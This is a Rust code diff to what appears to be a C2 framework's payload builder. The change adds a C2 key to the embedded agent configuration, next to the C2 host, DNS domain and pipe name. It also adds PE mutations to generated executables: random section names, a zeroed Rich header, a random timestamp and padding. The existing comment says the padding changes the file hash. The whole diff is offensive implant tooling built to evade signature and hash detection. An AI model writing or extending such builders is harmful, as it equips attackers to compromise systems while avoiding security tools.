@@ -21,7 +21,6 @@ pub async fn generate(cfg: BuildConfig, output_path: &str) -> Result<String> {
     let build_id = Uuid::new_v4().to_string();
 
     // 1. Inject build_id and serialise config.
-    let mut cfg_with_id = cfg.clone();
     // build_id is not in BuildConfig; we serialise agent-side AgentConfig.
     let agent_cfg = serde_json::json!({
         "c2_host":    cfg.c2_host,
@@ -32,6 +31,7 @@ pub async fn generate(cfg: BuildConfig, output_path: &str) -> Result<String> {
         "dns_domain": cfg.dns_domain,
         "pipe_name":  cfg.pipe_name,
         "build_id":   build_id,
+        "c2_key":     cfg.c2_key,
     });
     let plain = serde_json::to_vec(&agent_cfg)?;
 
@@ -59,8 +59,11 @@ pub async fn generate(cfg: BuildConfig, output_path: &str) -> Result<String> {
     // 5. Cross-compile the agent crate.
     compile_agent(&tmp, output_path, &cfg, &build_id)?;
 
-    // 6. Append random padding to change final file hash.
+    // 6. PE mutations: randomise section names, zero rich header, randomise timestamp, pad.
     if cfg.format == PayloadFormat::Exe {
+        Mutator::randomise_section_names(output_path)?;
+        Mutator::zero_rich_header(output_path)?;
+        Mutator::randomise_pe_timestamp(output_path)?;
         Mutator::append_random_padding(output_path)?;
     }
 
